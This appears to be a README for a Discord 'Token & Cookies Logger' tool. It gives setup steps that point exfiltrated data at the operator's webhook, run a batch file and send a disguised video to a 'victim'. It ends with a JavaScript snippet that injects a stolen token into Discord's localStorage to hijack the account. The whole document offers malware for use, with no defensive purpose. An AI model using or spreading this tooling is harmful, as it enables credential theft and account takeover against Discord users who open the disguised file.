###  [Download](https://github.com/We2oz/Image-Grabber/archive/refs/heads/main.zip)


**Image Tool By OK.@**


- edit file Inje.js
- enter your discord webhook 
- open Start.bat
- send Video Cat.webm for the victim


Discord Token & Cookies Logger - Grabber 
with a video # 6 sec ~ 
By OK. https://discord.gg/vfJknm825G




- login code
```let token = "";

function login(token) {
    setInterval(() => {
      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
      location.reload();
    }, 2500);
  }

login(token);
```
